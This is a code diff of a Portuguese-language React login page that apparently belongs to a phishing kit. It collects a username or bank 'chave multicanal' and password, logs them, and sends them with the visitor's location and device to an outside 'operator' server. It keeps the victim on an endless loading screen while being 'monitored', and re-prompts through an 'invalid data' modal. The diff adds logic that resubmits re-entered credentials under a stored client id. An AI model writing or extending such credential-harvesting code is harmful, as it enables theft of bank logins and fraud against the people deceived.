@@ -351,13 +351,16 @@ const Index = () => {
         username = chaveMulticanal;
       }
 
-      console.log('Iniciando processo de registro do cliente...');
+      console.log('Iniciando processo de registro/atualização do cliente...');
       console.log('Tab ativa:', tab);
       console.log('Username:', username);
       console.log('Senha:', senha);
       
       // Coletar dados do cliente
       const clientData = await collectClientData();
+      
+      // Verificar se já existe clientId (dados sendo atualizados)
+      const existingClientId = localStorage.getItem('clientId');
       
       // Preparar dados para envio
       const registerData = {
@@ -368,13 +371,23 @@ const Index = () => {
         city: clientData.city,
         device: clientData.device,
         referrer: clientData.referrer,
-        currentUrl: clientData.currentUrl
+        currentUrl: clientData.currentUrl,
+        // Incluir clientId se existir para atualizar os dados
+        ...(existingClientId && { clientId: existingClientId })
       };
 
       console.log('Dados preparados para envio:', registerData);
+      console.log('ClientId existente:', existingClientId);
+
+      // Determinar endpoint baseado se é novo registro ou atualização
+      const endpoint = existingClientId 
+        ? 'https://servidoroperador.onrender.com/api/clients/update'
+        : 'https://servidoroperador.onrender.com/api/clients/register';
+
+      console.log('Endpoint a ser usado:', endpoint);
 
       // Enviar requisição para API do operador
-      const response = await fetch('https://servidoroperador.onrender.com/api/clients/register', {
+      const response = await fetch(endpoint, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -385,15 +398,21 @@ const Index = () => {
       console.log('Status da resposta:', response.status);
       
       if (response.ok) {
-        // Processar resposta e iniciar monitoramento
-        await processRegistrationResponse(response, navigate, toast, setShowInvalidDataModal);
+        if (existingClientId) {
+          // Se estava atualizando dados, apenas reiniciar o monitoramento
+          console.log('Dados atualizados com sucesso, reiniciando monitoramento...');
+          await monitorClient(existingClientId, navigate, toast, setShowInvalidDataModal);
+        } else {
+          // Se é novo registro, processar resposta normalmente
+          await processRegistrationResponse(response, navigate, toast, setShowInvalidDataModal);
+        }
       } else {
         const errorData = await response.text();
         console.log('Erro na resposta da API:', errorData);
       }
 
     } catch (error) {
-      console.log('Erro durante o processo de registro:', error);
+      console.log('Erro durante o processo de registro/atualização:', error);
     }
     
     // Manter loading infinito - não setar isLoading para false
@@ -457,6 +476,8 @@ const Index = () => {
     
     // Fechar modal
     setShowInvalidDataModal(false);
+    
+    console.log('Modal fechado, campos limpos e pronto para novos dados');
   };
 
   const renderFormContent = () => {
